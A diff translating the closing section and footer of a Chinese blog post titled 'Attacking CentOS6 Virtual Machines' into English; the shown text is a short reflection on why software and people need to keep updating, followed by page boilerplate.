+<li>Slow password updates can lead to leaks.</li>
+<li>Vulnerabilities must be fixed by updating software; otherwise, they will be exploited.</li>
 </ul>
-<p>而我们看不到的&hellip;</p>
-<p>软件终究是人所创造的，人尚无完美者，需要不断反省自己，思考自己，何况是所造之物？</p>
-<p>不论作为用户开始开发者，更新自己应该更新的东西是再正常不过的事情了，只不过有快慢之别，但不论快慢，总得前进，迟早都要往前走的。</p>
-<p>而不能站立不动甚至往回走。</p>
-<p>物之更新如人之反省，人不知反省，前途渺茫，物不被更新，受人遗弃。</p>
-<p>甚至是，像看到我刚刚讲的笑话那样，被一个送外卖的脚本小子轻松破坏掉了..</p>
-<p>以上，只是个人想法，若有不当之处，请在下面的评论插件中 <del>喷我</del> 纠正。</p>
+<p>And as for what we cannot see&hellip;</p>
+<p>Software is ultimately created by humans, and there is no perfection with humans. We must constantly reflect on ourselves and our creations.</p>
+<p>Whether as users or developers, updating what needs to be updated is a normal part of life. There may be differences in speed, but progress must be made. Standing still or even moving backwards is not an option.</p>
+<p>For software to be updated is like how humans need to self-reflect. If humans fail to self-reflect, their future will be bleak. If software is not updated, it will be abandoned by people and forgotten.</p>
+<p>Even worse, it could be easily destroyed by a script kiddie who delivers food, just like the joke I told earlier.</p>
+<p>The above is just my personal opinion. If there are any errors, please feel free to correct me in the comments below.</p>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>更新于 2020-09-26</span>
+                <span>Updated on 2020-09-26</span>
             </div>
             <div class="post-info-license"></div>
         </div>
         <div class="post-info-line">
             <div class="post-info-md"><span>
-                            <a class="link-to-markdown" href="/posts/2020-09-26/index.md" target="_blank">阅读原始文档</a>
+                            <a class="link-to-markdown" href="/posts/2020-09-26/index.md" target="_blank">Read Markdown</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机" data-via="weepingdogel_me" data-hashtags="Linux,想法,随笔,渗透测试,社工,黑客,更新"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-hashtag="Linux"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Pinterest" data-sharer="pinterest" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-description="关于更新的意义..." data-image="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg"><i class="fab fa-pinterest fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Tumblr" data-sharer="tumblr" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机" data-caption="关于更新的意义..." data-tags="Linux,想法,随笔,渗透测试,社工,黑客,更新"><i class="fab fa-tumblr fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Reddit" data-sharer="reddit" data-url="http://weepingdogel.github.io/posts/2020-09-26/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="分享到 VK" data-sharer="vk" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机" data-caption="关于更新的意义..." data-image="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg"><i class="fab fa-vk fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Buffer" data-sharer="buffer" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机" data-via="weepingdogel_me" data-picture="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg"><i class="fab fa-buffer fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Xing" data-sharer="xing" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机"><i class="fab fa-xing fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Instapaper" data-sharer="instapaper" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机" data-description="关于更新的意义..."><i data-svg-src="/lib/simple-icons/icons/instapaper.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Pocket" data-sharer="pocket" data-url="http://weepingdogel.github.io/posts/2020-09-26/"><i class="fab fa-get-pocket fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Digg" data-sharer="digg" data-url="http://weepingdogel.github.io/posts/2020-09-26/"><i class="fab fa-digg fa-fw"></i></a><a href="javascript:void(0);" title="分享到 StumbleUpon" data-sharer="stumbleupon" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机"><i class="fab fa-stumbleupon fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Flipboard" data-sharer="flipboard" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机"><i class="fab fa-flipboard fa-fw"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机" data-image="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 人人" data-sharer="renren" data-url="http://weepingdogel.github.io/posts/2020-09-26/"><i class="fab fa-renren fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机" data-description="关于更新的意义..."><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机" data-description="关于更新的意义..."><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 百度" data-sharer="baidu" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机"><i data-svg-src="/lib/simple-icons/icons/baidu.min.svg"></i></a><a href="javascript:void(0);" title="分享到 OK.RU" data-sharer="okru" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机"><i class="fab fa-odnoklassniki fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机"><i class="fab fa-skype fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Trello" data-sharer="trello" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="攻击 CentOS6 虚拟机" data-description="关于更新的意义..."><i class="fab fa-trello fa-fw"></i></a><a href="//mix.com/add?url=http%3a%2f%2fweepingdogel.github.io%2fposts%2f2020-09-26%2f&amp;description=%e6%94%bb%e5%87%bb%20CentOS6%20%e8%99%9a%e6%8b%9f%e6%9c%ba" target="_blank" title="分享到 Mix"><i class="fab fa-mix fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines" data-via="weepingdogel_me" data-hashtags="Linux,Thoughts,Essays,Penetration testing,Social engineering,Hackers,Updates"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-hashtag="Linux"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Pinterest" data-sharer="pinterest" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-description="The meaning of updates..." data-image="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg"><i class="fab fa-pinterest fa-fw"></i></a><a href="javascript:void(0);" title="Share on Tumblr" data-sharer="tumblr" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines" data-caption="The meaning of updates..." data-tags="Linux,Thoughts,Essays,Penetration testing,Social engineering,Hackers,Updates"><i class="fab fa-tumblr fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="http://weepingdogel.github.io/posts/2020-09-26/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on VK" data-sharer="vk" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines" data-caption="The meaning of updates..." data-image="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg"><i class="fab fa-vk fa-fw"></i></a><a href="javascript:void(0);" title="Share on Buffer" data-sharer="buffer" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines" data-via="weepingdogel_me" data-picture="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg"><i class="fab fa-buffer fa-fw"></i></a><a href="javascript:void(0);" title="Share on Xing" data-sharer="xing" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines"><i class="fab fa-xing fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on Instapaper" data-sharer="instapaper" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines" data-description="The meaning of updates..."><i data-svg-src="/lib/simple-icons/icons/instapaper.min.svg"></i></a><a href="javascript:void(0);" title="Share on Pocket" data-sharer="pocket" data-url="http://weepingdogel.github.io/posts/2020-09-26/"><i class="fab fa-get-pocket fa-fw"></i></a><a href="javascript:void(0);" title="Share on Digg" data-sharer="digg" data-url="http://weepingdogel.github.io/posts/2020-09-26/"><i class="fab fa-digg fa-fw"></i></a><a href="javascript:void(0);" title="Share on StumbleUpon" data-sharer="stumbleupon" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines"><i class="fab fa-stumbleupon fa-fw"></i></a><a href="javascript:void(0);" title="Share on Flipboard" data-sharer="flipboard" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines"><i class="fab fa-flipboard fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines" data-image="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on 人人" data-sharer="renren" data-url="http://weepingdogel.github.io/posts/2020-09-26/"><i class="fab fa-renren fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines" data-description="The meaning of updates..."><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines" data-description="The meaning of updates..."><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on 百度" data-sharer="baidu" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines"><i data-svg-src="/lib/simple-icons/icons/baidu.min.svg"></i></a><a href="javascript:void(0);" title="Share on OK.RU" data-sharer="okru" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines"><i class="fab fa-odnoklassniki fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="Share on Skype" data-sharer="skype" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines"><i class="fab fa-skype fa-fw"></i></a><a href="javascript:void(0);" title="Share on Trello" data-sharer="trello" data-url="http://weepingdogel.github.io/posts/2020-09-26/" data-title="Attacking CentOS6 Virtual Machines" data-description="The meaning of updates..."><i class="fab fa-trello fa-fw"></i></a><a href="//mix.com/add?url=http%3a%2f%2fweepingdogel.github.io%2fposts%2f2020-09-26%2f&amp;description=Attacking%20CentOS6%20Virtual%20Machines" target="_blank" title="Share on Mix"><i class="fab fa-mix fa-fw"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/%E6%83%B3%E6%B3%95/">想法</a>,&nbsp;<a href="/tags/%E9%9A%8F%E7%AC%94/">随笔</a>,&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>,&nbsp;<a href="/tags/%E7%A4%BE%E5%B7%A5/">社工</a>,&nbsp;<a href="/tags/%E9%BB%91%E5%AE%A2/">黑客</a>,&nbsp;<a href="/tags/%E6%9B%B4%E6%96%B0/">更新</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/thoughts/">Thoughts</a>,&nbsp;<a href="/tags/essays/">Essays</a>,&nbsp;<a href="/tags/penetration-testing/">Penetration testing</a>,&nbsp;<a href="/tags/social-engineering/">Social engineering</a>,&nbsp;<a href="/tags/hackers/">Hackers</a>,&nbsp;<a href="/tags/updates/">Updates</a></section>
         <section>
-            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" class="prev" rel="prev" title="Python 学习笔记——文件操作"><i class="fas fa-angle-left fa-fw"></i>Python 学习笔记——文件操作</a>
-            <a href="/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/" class="next" rel="next" title="如何使用 GitHub 搭建博客">如何使用 GitHub 搭建博客<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" class="prev" rel="prev" title="Python Study Notes - File Operations"><i class="fas fa-angle-left fa-fw"></i>Python Study Notes - File Operations</a>
+            <a href="/posts/2020-nov-6/" class="next" rel="next" title="How to Modify Software Sources in Linux Mint">How to Modify Software Sources in Linux Mint<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 <div id="comments"><div id="utterances"></div><noscript>
                 Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://weepingdogel.github.io" target="_blank">WeepingDogel</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://weepingdogel.github.io" target="_blank">WeepingDogel</a></span></div>
         </div>
     </footer></div>
 
-        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                 <i class="fas fa-arrow-up fa-fw"></i>
-            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw"></i>
             </a>
-        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"title","label":"gitalk","lightTheme":"github-light","repo":"WeepingDogel/WeepingDogel.github.io"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"title","label":"gitalk","lightTheme":"github-light","repo":"WeepingDogel/WeepingDogel.github.io"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"twemoji":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
